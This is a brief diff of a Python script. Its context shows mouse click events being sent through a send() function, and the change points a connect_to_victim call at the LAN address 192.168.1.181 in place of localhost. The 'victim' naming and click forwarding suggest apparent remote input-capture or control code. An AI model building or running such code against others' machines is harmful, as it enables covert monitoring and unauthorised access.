@@ -53,7 +53,7 @@ def on_click(x, y, button, pressed):
     send({"type": "mouse_click", "button": str(button), "action": "down" if pressed else "up", "x": x, "y": y})
 
 
-server_host = 'localhost'
+server_host = '192.168.1.181'
 server_port = 8000
 connect_to_victim(server_host, server_port)
 
